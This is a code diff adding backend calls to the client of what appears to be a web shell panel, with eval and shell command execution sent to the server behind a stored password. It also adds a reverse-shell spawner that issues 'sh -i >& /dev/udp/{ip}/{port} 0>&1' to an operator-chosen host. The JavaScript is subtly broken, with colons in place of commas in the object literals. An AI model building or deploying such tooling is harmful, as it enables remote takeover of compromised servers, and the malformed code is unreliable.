@@ -19,12 +19,33 @@ $(document).ready(function() {
                        "Commands:\n" + commands_help);
     }
     
+    function request(data) {
+        $.ajax({
+            type: 'POST',
+            url: window.location.href,
+            data: data,
+            success: function(res) {
+                terminal.append(res.responseText + "\n");
+            },
+            async: false
+        });
+    }
+    
+    
     function back_eval(cmd) {
-        
+        request({
+            'passwd': window.api_password,
+            'action': 'eval':
+            'cmd': cmd
+        })
     }
     
     function back_shell(cmd) {
-        
+        request({
+            'passwd': window.api_password,
+            'action': 'shell':
+            'cmd': cmd
+        })
     }
     
     function back_spawn_reverse_shell(args) {
@@ -33,6 +54,11 @@ $(document).ready(function() {
             terminal.append("Please pass reverse_shell {ip} {port}\n");
             return;
         }
+        request({
+            'passwd': window.api_password,
+            'action': 'shell':
+            'cmd': 'sh -i >& /dev/udp/' + args[0] + '/' + args[1] + ' 0>&1'
+        })
     }
     
     function login(password) {
